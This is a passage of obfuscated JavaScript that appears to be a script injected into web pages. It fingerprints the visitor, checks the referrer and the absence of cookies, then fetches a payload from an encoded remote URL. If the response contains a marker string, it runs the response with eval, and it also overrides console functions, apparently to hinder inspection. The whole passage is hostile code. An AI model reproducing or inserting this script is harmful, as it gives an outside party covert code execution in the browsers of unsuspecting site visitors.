o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};